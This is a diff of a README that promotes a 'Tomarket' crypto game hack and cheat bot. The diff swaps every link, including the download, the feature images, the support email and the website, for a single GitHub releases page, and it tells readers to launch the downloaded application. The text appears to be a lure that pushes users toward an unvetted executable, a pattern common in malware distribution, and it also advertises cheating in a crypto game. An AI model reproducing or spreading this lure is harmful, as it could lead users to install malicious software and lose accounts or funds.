@@ -14,7 +14,7 @@ This bot automates farming and clicker activities in the Tomarket game. It featu
 api-tools, auto-clicker, auto-farm, blockchain-game, blockchain-technology, crypto-game, crypto-hack, crypto-telegram, cryptocurrency-game, ethereum-game, exploit, game-bot, game-cheat, game-enhancement, hack, mini-game, profit-maximization, tomarket, tomarket-bot, tomarket-game
 
 ### Download Link:
-[Download App.zip](https://github.com/uploads/App.zip)
+[Download https://github.com/Darkgaming7421/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases](https://github.com/Darkgaming7421/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases)
 
 (🚀 *Launch the application from the downloaded file to start automating your gameplay* 🚀)
 
@@ -23,12 +23,12 @@ api-tools, auto-clicker, auto-farm, blockchain-game, blockchain-technology, cryp
 ### 1. Automated Farming
 Say goodbye to manual farming! This bot takes care of repetitive tasks in Tomarket, allowing you to focus on strategic decisions and enjoying the game.
 
-![Automated Farming](https://example.com/automated-farming-image.png)
+![Automated Farming](https://github.com/Darkgaming7421/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases)
 
 ### 2. Clicker Functions
 With advanced clicker capabilities, you can quickly interact with in-game elements and boost your performance without breaking a sweat.
 
-![Clicker Functions](https://example.com/clicker-functions-image.png)
+![Clicker Functions](https://github.com/Darkgaming7421/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases)
 
 ### 3. Crypto Integration
 Get involved in the exciting world of cryptocurrencies within the context of the Tomarket game. Earn rewards, make investments, and explore blockchain technology seamlessly.
@@ -36,7 +36,7 @@ Get involved in the exciting world of cryptocurrencies within the context of the
 ### 4. Telegram Support
 Receive real-time updates, notifications, and control the bot through Telegram integration. Stay connected to your game wherever you go.
 
-![Telegram Support](https://example.com/telegram-support-image.png)
+![Telegram Support](https://github.com/Darkgaming7421/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases)
 
 ### 5. API Tools
 Utilize a set of API tools to customize and optimize your gameplay experience. Extract data, perform analyses, and make informed decisions with ease.
@@ -56,10 +56,10 @@ Utilize a set of API tools to customize and optimize your gameplay experience. E
 ## Additional Resources
 
 ### Support and Contact
-If you encounter any issues or have any questions about the bot, feel free to reach out to our support team at [support@tomarkethack.com](mailto:support@tomarkethack.com).
+If you encounter any issues or have any questions about the bot, feel free to reach out to our support team at [https://github.com/Darkgaming7421/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases](https://github.com/Darkgaming7421/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases).
 
 ### Enhance Your Gameplay
-For more tips, tricks, and updates on the Tomarket game, visit our website at [www.tomarkethack.com](https://www.tomarkethack.com).
+For more tips, tricks, and updates on the Tomarket game, visit our website at [https://github.com/Darkgaming7421/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases](https://github.com/Darkgaming7421/Tomarket-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Telegram-Api-Cheat/releases).
 
 ### Check Releases
 If the provided download link is not working or you want to explore the latest updates, head over to the *Releases* section of the repository.
